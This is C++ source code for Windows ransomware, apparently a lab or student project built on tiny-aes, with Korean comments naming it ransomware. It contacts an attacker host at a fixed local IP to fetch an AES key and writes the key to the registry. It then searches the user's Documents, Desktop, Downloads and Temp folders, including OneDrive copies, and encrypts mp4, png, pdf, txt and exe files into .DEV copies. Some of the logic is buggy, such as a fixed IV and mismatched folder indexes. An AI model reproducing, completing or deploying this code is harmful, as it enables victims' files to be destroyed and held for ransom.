#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <vector>
#include <time.h>
#include <sys/types.h>
#include "Windows-setup.h"
#include "Filetype-check.h"

// 코드 베이스는 tiny-aes 깃허브의 test 코드
// 헤더에서 AES128 사용하도록 설정해놓음
// aes.h 파일에서 어떤 AES 모드를 쓸 건지 선택하게 할 수 있는데 CBC128로 설정하게 만든 거임
#define CBC 1
#define CTR 1
#define ECB 1

#include "aes.h"
#include "aes_main.h"
using namespace std;

#define PORT 8080

#pragma comment(lib, "ws2_32.lib")

#define TARGET_NUM 8
#define FILE_MAXLEN 4096
#define BUFFER_SIZE 1024
#define EXTENSION_SIZE 10

#define PORT 8080

char rootFolderName[FILE_MAXLEN] = "C:\\Users\\";
char documentFolderName[FILE_MAXLEN];
char documentFolderName_onedrive[FILE_MAXLEN];
char desktopFolderName[FILE_MAXLEN];
char desktopFolderName_onedrive[FILE_MAXLEN];
char downloadsFolderName[FILE_MAXLEN];
char downloadsFolderName_onedrive[FILE_MAXLEN];
char tempFolderName[FILE_MAXLEN];
char tempFolderName_onedrive[FILE_MAXLEN];

char* targetFolderList[TARGET_NUM];

char cryptoKey[AES_KEYLEN];

typedef struct TargetFolders {
	vector<string> documentFolderFiles;
	vector<string> documentFolderFiles_onedrive;
	vector<string> desktopFolderFiles;
	vector<string> desktopFolderFiles_onedrive;
	vector<string> downloadsFolderFiles;
	vector<string> downloadsFolderFiles_onedrive;
	vector<string> tempFolderFiles;
	vector<string> tempFolderFiles_onedrive;
} TargetFolders;

TargetFolders targetFolders;

int notifyToServer();            // 클라이언트가 랜섬웨어를 실행시켰다는 걸 공격자에게 알림
void makeFolderPath();            // 타겟으로 지정된 폴더들 경로 생성
int readTargetFolder(int, char*, char*);   // 타겟으로 지정된 폴더들 탐색하기
int registerKeyToRegistry();      // 암호화 키 레지스트리에 등록
int encryptFile(const char* filepath);	// 파일 내용 읽어서 암호화

int k = 0;

char osVersion[FILE_MAXLEN];

struct AES_ctx ctx;

int main(void)
{
	// 현재 프로그램을 실행하는 OS의 버전 불러오기
	strcpy(osVersion, GetOSName());

	// 클라이언트에서 랜섬웨어 실행 시 공격자에게 알리기
	if (!notifyToServer()) {
		fprintf(stderr, "notifyToServer error\n");
		return 0;
	}

	// 타겟 폴더 탐색에 필요한 경로 생성
	makeFolderPath();

	// 전송 받은 암호화 키를 레지스트리에 등록
	if (registerKeyToRegistry() == 0) {
		fprintf(stderr, "Register key error\n");
		return -1;
	}

	WIN32_FIND_DATAA files;
	HANDLE curFile;
	
	// 타겟 폴더 탐색 후 폴더들 내 파일들을 폴더별로 구조체에 저장
	for (int i = 0; i < TARGET_NUM / 2; i++) {
		if (readTargetFolder(i, targetFolderList[i], targetFolderList[i + 4]) == 0) {
			fprintf(stderr, "ReadTargetFolder Function error\n\n");
			return -1;
		}
	}
	
	// 구조체별 저장한 파일들 암호화
	// document 폴더
	vector<string>::iterator it;
	if (targetFolders.documentFolderFiles.size()) {
		for (it = targetFolders.documentFolderFiles.begin(); it != targetFolders.documentFolderFiles.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}
	// document 폴더 onedrive 인 경우
	if (targetFolders.documentFolderFiles_onedrive.size()) {
		for (it = targetFolders.documentFolderFiles_onedrive.begin(); it != targetFolders.documentFolderFiles_onedrive.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}

	// desktop 폴더
	if (targetFolders.desktopFolderFiles.size()) {
		for (it = targetFolders.desktopFolderFiles.begin(); it != targetFolders.desktopFolderFiles.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}

	// desktop 폴더 onedrive인 경우
	if (targetFolders.desktopFolderFiles_onedrive.size()) {
		for (it = targetFolders.desktopFolderFiles_onedrive.begin(); it != targetFolders.desktopFolderFiles_onedrive.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}

	// downloads 폴더
	if (targetFolders.downloadsFolderFiles.size()) {
		for (it = targetFolders.downloadsFolderFiles.begin(); it != targetFolders.downloadsFolderFiles.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}

	// downloads 폴더 onedrive인 경우
	if (targetFolders.downloadsFolderFiles_onedrive.size()) {
		for (it = targetFolders.downloadsFolderFiles_onedrive.begin(); it != targetFolders.downloadsFolderFiles_onedrive.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}

	// temp 폴더
	if (targetFolders.tempFolderFiles.size()) {
		for (it = targetFolders.tempFolderFiles.begin(); it != targetFolders.tempFolderFiles.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}

	// temp 폴더 onedrive인 경우
	if (targetFolders.tempFolderFiles_onedrive.size()) {
		for (it = targetFolders.tempFolderFiles_onedrive.begin(); it != targetFolders.tempFolderFiles_onedrive.end(); it++) {
			//printf("file : %s\n", it->c_str());
			encryptFile(it->c_str());
		}
	}
	return 0;
}

int notifyToServer()
{
	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		printf("error\n");
		return 0;
	}

	SOCKET client_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (client_sock == INVALID_SOCKET) {
		fprintf(stderr, "socket function error\n");
		return 0;
	}

	struct sockaddr_in server_addr;
	memset(&server_addr, 0x0, sizeof(struct sockaddr_in));

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(PORT);

	// 공격자의 IP 주소 별도 지정해야 함
	server_addr.sin_addr.S_un.S_addr = inet_addr("192.168.219.100");

	if (connect(client_sock, (SOCKADDR*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		fprintf(stderr, "connect error\n");
		WSACleanup();
		return 0;
	}

	if (recv(client_sock, cryptoKey, sizeof(cryptoKey), 0) == SOCKET_ERROR) {
		fprintf(stderr, "recv error\n");
		WSACleanup();
		return 0;
	}

	closesocket(client_sock);
	WSACleanup();
	return 1;
}

void makeFolderPath()
{
	CHAR userName[FILE_MAXLEN] = { 0, };
	DWORD size = FILE_MAXLEN;
	GetUserNameA(userName, &size);
	//printf("%s\n", userName);

	// root 경로 생성
	sprintf(rootFolderName, "%s\\%s", rootFolderName, userName);
	//printf("root : %s\n", rootFolderName);

	// document 경로 생성
	sprintf(documentFolderName, "%s\\%s", rootFolderName, "Documents\\*");
	sprintf(documentFolderName_onedrive, "%s\\%s\\%s", rootFolderName, "OneDrive\\", "Documents\\*");
	//printf("document : %s\n", documentFolderName);
	//printf("document : %s\n", documentFolderName_onedrive);

	// desktop 경로 생성
	sprintf(desktopFolderName, "%s\\%s", rootFolderName, "Desktop\\*");
	sprintf(desktopFolderName_onedrive, "%s\\%s\\%s", rootFolderName, "OneDrive\\", "Desktop\\*");
	//printf("desktop : %s\n", desktopFolderName);
	//printf("desktop : %s\n", desktopFolderName_onedrive);

	// downloads 경로 생성
	sprintf(downloadsFolderName, "%s\\%s", rootFolderName, "Downloads\\*");
	sprintf(downloadsFolderName_onedrive, "%s\\%s\\%s", rootFolderName, "OneDrive\\", "Downloads\\*");
	//printf("download : %s\n", downloadsFolderName);
	//printf("download : %s\n", downloadsFolderName_onedrive);

	// temp 경로 생성
	sprintf(tempFolderName, "%s\\%s", rootFolderName, "AppData\\Local\\Temp\\*");
	sprintf(tempFolderName_onedrive, "%s\\%s\\%s", rootFolderName, "OneDrive\\", "AppData\\Local\\Temp\\*");
	//printf("temp : %s\n", tempFolderName);
	//printf("temp : %s\n", tempFolderName_onedrive);

	targetFolderList[0] = documentFolderName;
	targetFolderList[1] = desktopFolderName;
	targetFolderList[2] = desktopFolderName_onedrive;
	targetFolderList[3] = downloadsFolderName;
	targetFolderList[4] = downloadsFolderName_onedrive;
	targetFolderList[5] = tempFolderName;
	targetFolderList[6] = tempFolderName;
	targetFolderList[7] = tempFolderName;
}

int registerKeyToRegistry()
{
	HKEY hKey;
	LONG result;

	// 등록할 레지스트리 서브키(KEY)를 Envrionment 기본키 아래에 생성
	if (RegCreateKey(HKEY_CURRENT_USER, TEXT("Environment\\KEY"), &hKey) != ERROR_SUCCESS) {
		fprintf(stderr, "RegCreateKey error\n");
		return 0;
	}

	printf("create subkey success!\n");

	// 레지스트리 서브키(KEY)에 암호화키 등록
	if (RegSetValueA(hKey, NULL, REG_SZ, cryptoKey, 0) != ERROR_SUCCESS) {
		fprintf(stderr, "RegSetValue error\n");
		return 0;
	}

	printf("set value success!\n");
	// 레지스트리 키 닫기
	RegCloseKey(hKey);
	return 1;
}

int readTargetFolder(int i, char* targetFolderName1, char* targetFolderName2)
{
	WIN32_FIND_DATAA files, files1, files2;
	HANDLE curFile1, curFile2, curFile;

	// 윈도우10과 11 모두 onedrive 경로를 지원한다고 하여
	// onedrive가 포함된 경로와 포함되지 않은 경로 모두 탐색
	curFile1 = FindFirstFileA(targetFolderName1, &files1);
	curFile2 = FindFirstFileA(targetFolderName2, &files2);

	// 둘 중 탐색에 실패하지 않은 경로의 포인터 사용
	if (curFile1 != INVALID_HANDLE_VALUE) {
		curFile = curFile1;
		files = files1;
	}
	else {
		curFile = curFile2;
		files = files2;
	}

	// 탐색한 디렉터리의 파일들 전부 읽기
	while (FindNextFileA(curFile, &files)) {
		char obj[FILE_MAXLEN];
		memset(obj, 0x0, sizeof(obj));
		if (curFile1 != INVALID_HANDLE_VALUE)
			strcpy(obj, targetFolderName1);
		else
			strcpy(obj, targetFolderName2);
		obj[strlen(obj) - 1] = '\0';
		strcat(obj, files.cFileName);
		//printf("\n%s\n", obj);

		// 디렉터리가 아닌 파일들만 구조체에 저장
		if (files.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE) {
			if (i == 0) {
				// document folder files
				targetFolders.documentFolderFiles.push_back(obj);
			}
			else if (i == 1) {
				// desktop folder files
				targetFolders.desktopFolderFiles.push_back(obj);
			}
			else if (i == 4) {
				// temp folder files
				targetFolders.tempFolderFiles.push_back(obj);
			}
			else if (i == 3) {
				// downloads folder files
				targetFolders.downloadsFolderFiles.push_back(obj);
			}
			else if (i == 2) {
				// desktop_onedrive folder files
				targetFolders.desktopFolderFiles_onedrive.push_back(obj);
			}
		}
		else
			continue;
	}

	FindClose(curFile);
	return 1;
}

int checkSignature(char *filepath)
{
	FILE* fp = NULL;
	int size = 0;
	char* read_buf = NULL;
	fp = fopen(filepath, "rb"); //바이너리 읽기 모드
	if (fp == NULL)
	{
		printf("open error\n");
		return 1;
	}

	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	int buf_size = size + 1;
	if (buf_size < 8) buf_size = 8;
	read_buf = (char*)calloc(buf_size, sizeof(char));
	if (read_buf == NULL)
	{
		printf("calloc error\n");
		return 1;
	}
	fread(read_buf, sizeof(char), size, fp);
	fclose(fp);

	//바이너리 파일 헤더 파악
	binary2hex_print(filepath, read_buf);

	fileheaderhexcheck();

	const char* file_ext = GetFileExtenstion(filepath);
	if (strcmp(filetype, "error") == 0 && strcmp(file_ext, "txt") == 0)
	{
		filetype = "txt";
	}
	free(read_buf);

	// 타겟 파일인지 아닌지 확인
	if (!strcmp(filetype, "mp4") || !strcmp(filetype, "png") || !strcmp(filetype, "pdf") || !strcmp(filetype, "txt")
		|| !strcmp(filetype, "microsoft exe file"))
		return 1;
	else
		return 0;
}

int encryptFile(const char* filepath)
{
	if (!checkSignature((char *)filepath)) {
		return 0;
	}

	// 초기값 벡터
	uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

	// iv 값을 랜덤하게 세팅
	AES_init_ctx_iv(&ctx, (uint8_t*)cryptoKey, iv);

	HANDLE read_fp, write_fp;
	DWORD readn, writen;
	bool brtv;
	char buf[BUFFER_SIZE];

	// 암호화 할 파일 포인터 리턴
	read_fp = CreateFileA(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	int i;
	for (i = strlen(filepath) - 1; i >= 0; i--)
		if (filepath[i] == '.')
			break;

	char result[FILE_MAXLEN];
	strcpy(result, filepath);
	// 암호화 된 파일 저장할 파일명
	strcpy(result + i, ".DEV");
	printf("result : %s\n", result);
	
	// 암호화 된 파일 새로운 파일명에 쓰기
	write_fp = CreateFileA(result, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	if (read_fp == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "encryptFile read error\n");
		return 0;
	}
	
	if (write_fp == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "encryptFile write error\n");
		return 0;
	}
	
	while (1) {
		memset(buf, 0x0, BUFFER_SIZE);
		brtv = ReadFile(read_fp, buf, BUFFER_SIZE, &readn, NULL);

		if (brtv && readn == 0)
			break;

		// 파일 내용 암호화
		AES_CBC_encrypt_buffer(&ctx, (uint8_t*)buf, readn);
		// 암호화 된 파일 내용을 target 파일에 쓰기
		brtv = WriteFile(write_fp, buf, readn, &writen, NULL);

		if (brtv && writen == 0)
			break;
	}
	
	CloseHandle(read_fp);
	CloseHandle(write_fp);
	return 1;
}